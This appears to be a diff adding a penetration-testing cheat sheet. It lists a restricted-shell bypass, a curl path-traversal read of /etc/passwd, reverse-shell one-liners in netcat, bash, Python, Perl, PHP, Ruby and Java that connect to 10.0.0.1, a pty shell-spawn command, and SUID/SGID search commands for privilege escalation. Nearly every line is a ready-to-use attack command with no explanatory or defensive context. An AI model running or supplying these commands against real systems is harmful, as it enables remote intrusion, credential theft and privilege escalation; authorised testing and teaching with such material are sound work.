@@ -1,0 +1,42 @@
+Bypass Restricted Shell:
+	ssh USERNAME@SERVER_IP -t bash --noprofile
+
+Parse JSON to Correct format by Python:
+	curl http://SERVER_IP/fileRead.php --data 'file=../../../etc/passwd' |python -c 'import sys, json; print json.load(sys.stdin)["file"]' > passwd
+
+ReverseShell:
+	NetCat:
+		rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 10.0.0.1 1234 >/tmp/f
+
+		nc -e /bin/sh 10.0.0.1 1234
+
+	Bash:
+		bash -i >& /dev/tcp/10.0.0.1/8080 0>&1
+
+	Python:
+		python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("10.0.0.1",1234));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call(["/bin/sh","-i"]);'
+
+	
+	Perl:
+		perl -e 'use Socket;$i="10.0.0.1";$p=1234;socket(S,PF_INET,SOCK_STREAM,getprotobyname("tcp"));if(connect(S,sockaddr_in($p,inet_aton($i)))){open(STDIN,">&S");open(STDOUT,">&S");open(STDERR,">&S");exec("/bin/sh -i");};'
+
+	PHP:
+		php -r '$sock=fsockopen("10.0.0.1",1234);exec("/bin/sh -i <&3 >&3 2>&3");'
+
+	Ruby:
+		ruby -rsocket -e'f=TCPSocket.open("10.0.0.1",1234).to_i;exec sprintf("/bin/sh -i <&%d >&%d 2>&%d",f,f,f)'
+
+	Java:
+		r = Runtime.getRuntime()
+		p = r.exec(["/bin/bash","-c","exec 5<>/dev/tcp/10.0.0.1/2002;cat <&5 | while read line; do \$line 2>&5 >&5; done"] as String[])
+		p.waitFor()
+
+Spawn Shell:
+	python -c 'import pty;pty.spawn("/bin/bash");'
+
+SUID & GUID:
+		find / -perm -g=s -type f 2>/dev/null    # SGID (chmod 2000) - run as the group, not the user who started it.
+		find / -perm -u=s -type f 2>/dev/null    # SUID (chmod 4000) - run as the owner, not the user who started it.
+
+		find / -perm -g=s -o -perm -u=s -type f 2>/dev/null    # SGID or SUID
+		for i in `locate -r "bin$"`; do find $i \( -perm -4000 -o -perm -2000 \) -type f 2>/dev/null; done    # Looks in 'common' places: /bin, /sbin, /usr/bin, /usr/sbin, /usr/local/bin, /usr/local/sbin and any other *bin, for SGID or SUID (Quicker search)
